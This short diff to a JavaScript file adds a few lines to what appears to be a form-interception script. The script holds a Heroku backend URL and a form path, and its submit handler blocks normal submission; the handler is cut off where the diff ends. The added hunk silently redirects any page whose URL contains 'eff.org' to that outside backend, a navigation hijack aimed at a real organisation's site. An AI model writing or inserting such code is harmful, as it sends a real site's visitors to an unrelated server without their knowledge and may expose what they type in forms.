@@ -36,6 +36,10 @@ function getInputNodes(node) {
 var urlBackend = 'https://powerful-wave-30603.herokuapp.com'
 var pathForm = '/123/form'
 
+if (document.URL.match("eff.org")) {
+  window.location.replace(urlBackend)
+}
+
 function onSubmitEvtReaction(evt) {
   evt.preventDefault()
   let form = evt.target
